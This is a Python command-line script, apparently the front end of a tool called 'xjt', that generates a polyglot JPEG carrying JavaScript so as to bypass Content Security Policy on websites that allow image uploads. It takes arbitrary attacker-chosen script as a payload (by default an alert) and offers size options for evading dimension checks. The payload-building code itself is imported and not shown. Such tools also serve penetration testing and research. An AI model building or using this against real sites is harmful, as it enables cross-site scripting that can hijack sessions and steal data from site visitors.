try:
    from xjt.gen import *
except:
    from gen import *

import argparse, shutil

def parse_args():
    parser = argparse.ArgumentParser(description="Generates a polyglot XSS jpeg that can be used to bypass CSP on websites if image uploads are allowed")

    parser.add_argument(
        '--width',
        help = "Change the width of the output image to bypass dimension restrictions",
        default = -1,
        type = int
    )

    parser.add_argument(
        '--height',
        help = "Change the height of the output image to bypass dimension restrictions",
        default = -1,
        type = int
    )

    parser.add_argument(
        '-o', '--output_file',
        help = 'Where to save the payload JPEG. Save to xjt.jpg by default.',
        default = 'xjt.jpg',
        type = str
    )

    parser.add_argument(
        '-p', '--payload',
        help='The javascript code you want to execute. DO NOT USE \' IN YOUR PAYLOAD! By default it runs alert("XSS EXPLOITED!");.',
        default = 'alert("XSS EXPLOITED!");',
        type = str
    )

    return parser.parse_args()

def main():
    if shutil.which("exiftool") is None:
        raise Exception("You do not have exiftool installed!")
    args = parse_args()
    generate_payload(width=args.width, height=args.height, js_payload=args.payload, output_file = args.output_file)
    print("DONE! Payload has been saved to {}".format(args.output_file))

if __name__ == "__main__":
    main()
